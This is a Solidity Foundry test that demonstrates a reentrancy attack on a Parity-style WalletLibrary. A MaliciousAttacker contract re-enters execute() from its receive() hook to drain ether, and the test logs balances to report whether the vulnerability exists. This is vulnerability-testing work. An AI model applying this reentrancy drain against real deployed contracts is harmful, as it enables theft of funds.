// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/parity_wallet_bug_2.sol";

contract MaliciousAttacker {
    WalletLibrary public wallet;
    uint private count;
    
    constructor(WalletLibrary _wallet) {
        wallet = _wallet;
    }
    
    receive() external payable {
        if (count < 1) {
            count++;
            wallet.execute(address(this), 1 ether, "");
        }
    }
}

contract ReentrancyTest is Test {
    WalletLibrary public wallet;
    MaliciousAttacker public attacker;

    function setUp() public {
        // Deploy and initialize wallet
        wallet = new WalletLibrary();
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        wallet.initWallet(owners, 1, 100 ether); // High daily limit
        
        // Deploy attacker and add as owner
        attacker = new MaliciousAttacker(wallet);
        wallet.addOwner(address(attacker));
        
        // Fund wallet
        payable(address(wallet)).transfer(2 ether);
    }

    function testReentrancyVulnerability() public {
        // Record initial state
        uint initialWalletBalance = address(wallet).balance;
        uint initialAttackerBalance = address(attacker).balance;

        console.log("--- BEFORE-Trigger State ---");
        console.log("Wallet balance:", vm.toString(initialWalletBalance), "wei");
        console.log("Attacker balance:", vm.toString(initialAttackerBalance), "wei");
        console.log("");
        
        console.log("--- Trigger Reentrancy ---");
        wallet.execute(address(attacker), 1 ether, "");
        console.log("");
        
        // Record final state
        uint finalWalletBalance = address(wallet).balance;
        uint finalAttackerBalance = address(attacker).balance;
        console.log("--- AFTER-Trigger State ---");
        console.log("Wallet balance:", vm.toString(finalWalletBalance), "wei");
        console.log("Attacker balance:", vm.toString(finalAttackerBalance), "wei");
        console.log("");

        // Calculate balance changes
        uint walletDrained = initialWalletBalance - finalWalletBalance;
        uint attackerGained = finalAttackerBalance - initialAttackerBalance;
        
        // Differential validation
        if (walletDrained == 2 ether && attackerGained == 2 ether) {
            console.log("Vulnerability Exists: Successful reentrancy attack drained 2 ETH from wallet");
        } else if (walletDrained > 0 && attackerGained > 0 && walletDrained == attackerGained) {
            console.log("Vulnerability Exists: Partial reentrancy drained", vm.toString(walletDrained), "ETH");
        } else if (walletDrained > 1 ether || attackerGained > 1 ether) {
            console.log("Vulnerability Exists: Abnormal value transfer detected");
        } else {
            console.log("Vulnerability not Exist: No funds drained outside expected transfer");
        }
    }
}